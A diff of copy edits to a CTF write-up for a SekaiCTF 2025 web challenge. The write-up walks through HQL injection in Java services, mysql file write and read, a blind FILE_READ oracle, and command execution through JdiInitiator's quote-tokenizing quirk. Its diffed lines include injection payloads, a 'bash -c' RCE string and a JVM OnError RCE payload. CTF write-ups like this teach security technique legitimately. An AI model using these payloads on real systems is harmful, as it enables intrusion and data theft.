@@ -10,6 +10,7 @@ author: "VXXDXX"
 
 > Please note that this challenge has no outgoing network access.
 
+Author: irogir  
 Solves: 3
 
 ![Solves](/static/img/posts/2025-sekai-web-hqli-me/hqli-solves.webp)
@@ -26,14 +27,14 @@ The challenge deployment consists of 3 containers:
 - `authn_service` containing the flag,
 - mysql
 
-We can reach any container from within another, but only `order_service` is exposed externally. Both `order_service` and `authn_service` are Java applications that use HQL to query the underlying databases, however `order_service` uses mysql from another container, while `authn_service` opted for in-memory H2 db. 
+We can reach any container from within another, but only `order_service` is exposed externally. Both `order_service` and `authn_service` are Java applications that use HQL to query the underlying databases; however, `order_service` uses mysql from another container, while `authn_service` opted for an in-memory H2 db. 
 
 
 ---
 
-## 2. SQLi and broken validation in order_service
+## 2. SQLi and Broken Validation in order_service
 
-`main` function in `order_service` contains the following statement preparation which is vulnerable to injection.
+The `main` function in `order_service` contains the following statement preparation, which is vulnerable to injection.
 
 ```java
 var sql = "select %s from Order o where o.username=\"%s\"".formatted(fields, authnUser);
@@ -69,18 +70,18 @@ Similarly, `authn_service` is also susceptible to SQL injection.
 var sql = "select s from Session s where s.sessionId = \"%s\"".formatted(sessionId);
 ```
 
-`authn_service` does no validation itself on the input. This endpoint is used by `order_service`, but in this case it correctly validates our input, so we can't exploit this injection indirectly via `order_service`.
+`authn_service` does no validation itself on the input. This endpoint is used by `order_service`, but in this case, it correctly validates our input, so we can't exploit this injection indirectly via `order_service`.
 
 ---
 
 ## 4. Exploiting SQLi in order_service
 
-We're going to exploit the SQLi in order_service in two different ways:
+We're going to exploit the SQLi in the `order_service` in two different ways:
 
 - File write/file read in the mysql container,
-- Code execution in the order_service container.
+- Code execution in the `order_service` container.
 
-### File Write/File Read in the mysql Container,
+### File Write/File Read in the mysql Container
 
 For this one, we're going to use the [sql()](https://docs.jboss.org/hibernate/orm/6.4/querylanguage/html_single/Hibernate_Query_Language.html#function-sql) method to embed native SQL in HQL, allowing us to call `LOAD_FILE` and `SELECT ... INTO OUTFILE ...` from mysql and end the statement early with a comment.  
 The mysql server has [secure_file_priv](https://dev.mysql.com/doc/refman/8.4/en/server-system-variables.html#sysvar_secure_file_priv) set to `/var/lib/mysql-files/`.
@@ -97,7 +98,7 @@ mysql> SHOW VARIABLES LIKE 'secure_file%';
 As the docs state:
 > If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
 
-If we weren't limitted by this, we could possibly write and load UDFs to gain RCE. At least, we can still write and read arbitrary data in `/var/lib/mysql-files/`.
+If we weren't limited by this, we could write and load UDFs to gain RCE. At least, we can still write and read arbitrary data in `/var/lib/mysql-files/`.
 
 ![File write](/static/img/posts/2025-sekai-web-hqli-me/file_write.webp)
 
@@ -105,13 +106,13 @@ If we weren't limitted by this, we could possibly write and load UDFs to gain RC
 
 As we can see, even though the first request resulted in `500` status code due to `Column index out of range`, the file write still went through.
 
-### RCE in the orders_container via JdiInitiator constructor
+### RCE in the orders_container via JdiInitiator Constructor
 
-As mentioned before, one interesting quirk of HQL is that it allows us to call constructors of Java classes with the `new` keyword in the query. For the majority of classes, the constructors do simple assignments of the class fields so they're not useful at all. One major exception is [JdiInitiator](https://docs.oracle.com/en/java/javase/21/docs/api/jdk.jshell/jdk/jshell/execution/JdiInitiator.html#%3Cinit%3E(int,java.util.List,java.lang.String,boolean,java.lang.String,int,java.util.Map)). As the docs state
+As mentioned before, one interesting quirk of HQL is that it allows us to call constructors of Java classes with the `new` keyword in the query. For the majority of classes, the constructors do simple assignments of the class fields, so they're not useful at all. One major exception is [JdiInitiator](https://docs.oracle.com/en/java/javase/21/docs/api/jdk.jshell/jdk/jshell/execution/JdiInitiator.html#%3Cinit%3E(int,java.util.List,java.lang.String,boolean,java.lang.String,int,java.util.Map)). As the docs state
 
 > Start the remote agent and establish a JDI connection to it.
 
-This boils down to launching the `java` executable with a bunch of arguments that we can affect by the constructor arguments. What caught my eye immediately is the `customConnectorArgs` argument:
+This boils down to launching the `java` executable with a bunch of arguments that we can affect by the constructor arguments. What caught my eye immediately was the `customConnectorArgs` argument:
 
 > customConnectorArgs - custom arguments passed to the connector. These are JDI com.sun.jdi.connect.Connector arguments. The vmexec argument is not supported.
 
@@ -164,10 +165,7 @@ Sadly, whatever we put will be appended with `/bin/${exe}`. The value of `exe` c
 String exe = argument(ARG_VM_EXEC, arguments).value();
 ```
 
-Which, as was noted in the docs, we can't set. But it's not lost yet!  
-Going deeper, [tokenizeCommand](https://github.com/openjdk/jdk21/blob/890adb6410dab4606a4f26a942aed02fb2f55387/src/jdk.jdi/share/classes/com/sun/tools/jdi/AbstractLauncher.java#L70)   
-
-The command is tokenized respecting a quote character that we control.
+Which, as was noted in the docs, we can't set. But it's not over yet! Going deeper, [tokenizeCommand](https://github.com/openjdk/jdk21/blob/890adb6410dab4606a4f26a942aed02fb2f55387/src/jdk.jdi/share/classes/com/sun/tools/jdi/AbstractLauncher.java#L70) tokenizes the command respecting a quote character that we control.
 
 ```java
 String quote = argument(ARG_QUOTE, arguments).value();
@@ -191,13 +189,13 @@ Let's check the logs:
 order_service-1  | Caused by: com.sun.jdi.connect.VMStartException: VM initialization failed for: bash -c id>/tmp/win /bin/java -Xdebug -Xrunjdwp:transport=dt_socket,address=localhost:41925,suspend=y,includevirtualthreads=n asdf 5
 ```
 
-Let's check output of strace:
+Let's check the output of strace:
 
 ```
 [pid   150] execve("/usr/bin/bash", ["bash", "-c", "id>/tmp/win", "/bin/java", "-Xdebug", "-Xrunjdwp:transport=dt_socket,address=localhost:41925,suspend=y,includevirtualthreads=n", "asdf", "5"], ["HOSTNAME=kali", "LANGUAGE=en_US:en", "JAVA_HOME=/opt/java/openjdk", "PWD=/app", "PORT=1337", "HOME=/nonexistent", "LANG=en_US.UTF-8", "JRE_CACERTS_PATH=/opt/java/openjdk/lib/security/cacerts", "SHLVL=0", "LC_ALL=en_US.UTF-8", "PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "JAVA_VERSION=jdk-21.0.8+9"]) = 0
 ```
 
-Let's check file system:
+Let's check the file system:
 
 ```
 nobody@kali:/app$ cat /tmp/win
@@ -237,7 +235,7 @@ var session = (Session) result.get(0);
 yield "user=" + session.user.username;
 ```
 
-If there's a result, we get 200 response back, otherwise the server responds with 401. We're going to use `SUBSTRING` and `FILE_READ` to create an oracle that checks for a char at given position in flag. We can confirm it works with the following 2 requests (note: I exposed `authn_service` locally to make it easier to debug).
+If there's a result, we get `200` response back; otherwise, the server responds with `401`. We're going to use `SUBSTRING` and `FILE_READ` to create an oracle that checks for a char at given position in the flag. We can confirm it works with the following 2 requests (note: I exposed `authn_service` locally to make it easier to debug).
 
 ![Oracle success](/static/img/posts/2025-sekai-web-hqli-me/oracle_success.webp)
 
@@ -245,7 +243,7 @@ If there's a result, we get 200 response back, otherwise the server responds wit
 
 ---
 
-## Putting The Pieces Together
+## Putting the Pieces Together
 
 Let's list what we've got:
 
@@ -253,11 +251,11 @@ Let's list what we've got:
 - RCE in `orders_service`,
 - file read oracle in `authn_service`.
 
-By combining all of these together, we can perform code execution in `orders_service` that will read the flag char by char from `authn_service` and then upload it to mysql container under `/var/lib/mysql-files/`. Afterwards, we can read the uploaded flag. Our exploit script will first upload the oracle script chunk by chunk onto the `orders_service` container, run it and poll for flag in mysql. 
+By combining all of these together, we can perform code execution in `orders_service` that will read the flag char by char from `authn_service` and then upload it to mysql container under `/var/lib/mysql-files/`. Afterwards, we can read the uploaded flag. Our exploit script will upload the oracle script chunk by chunk onto the `orders_service` container, run it, and poll for the flag in mysql. 
 
 ---
 
-## Solver script
+## Solver Script
 
 exploit.sh
 
@@ -403,7 +401,7 @@ echo "----------------------------------------------------"
 echo "The base64 payload was sent in chunks to /tmp/b64 and then executed."
 echo "Polling for flag in mysql"
 
-DATA='sessionId=d6574c34027979a77fa84b5cc7e09280&fields=sql%28%27to_base64%28LOAD_FILE%28%22%2Fvar%2Flib%2Fmysql-files%2Fflag%22%29%29+--+%27%29q'
+DATA="sessionId=${SESSION_ID}&fields=sql%28%27to_base64%28LOAD_FILE%28%22%2Fvar%2Flib%2Fmysql-files%2Fflag%22%29%29+--+%27%29q"
 tmp="$(mktemp)"
 trap 'rm -f "$tmp"' EXIT
 
@@ -640,13 +638,13 @@ SEKAI{test_flag}
 
 ## Final Notes
 
-- You can read the challenge creator's write-up [here](https://github.com/project-sekai-ctf/sekaictf-2025/blob/main/web/hqli-me/solution/e.py). The official solution uses `CSVWRITE` to achieve stacked sqli to create an alias in H2 for RCE. I wasn't aware it's possible,
+- You can read the challenge creator's write-up [here](https://github.com/project-sekai-ctf/sekaictf-2025/blob/main/web/hqli-me/solution/e.py). The official solution uses `CSVWRITE` to achieve stacked sqli to create an alias in H2 for RCE. I wasn't aware it was possible,
 - The official solution also uses another method for RCE with `JdiInitiator` via Java code injection. I also came up with yet another way to do it beforehand with `OnError` and heap size JVM flags like so:
 ```
 new jdk.jshell.execution.JdiInitiator(0, new list("-XX:OnError=id>/tmp/err.rce","-XX:OnOutOfMemoryError=id>/tmp/err2.rce","-XX:+CrashOnOutOfMemoryError","-Xmx3m","-XX:MaxMetaspaceSize=8m","-jar /app/target/hn-1.0-SNAPSHOT-jar-with-dependencies.jar"), new java.lang.String("jdk.jshell.execution.RemoteExecutionControl"), true, null, 8000, new java.util.HashMap(2))
 ```
 
-Funnily enough it worked locally, but not on remote. I'm sure there's a more proper way to trigger it this way. There could possibly be even more ways to RCE with `JdiInitiator`.  
+Funnily enough it worked locally, but not on remote. I'm sure there's a more proper way to trigger it this way. There could be even more ways to RCE with `JdiInitiator`.  
 
 XOXO,  
 VXXDXX
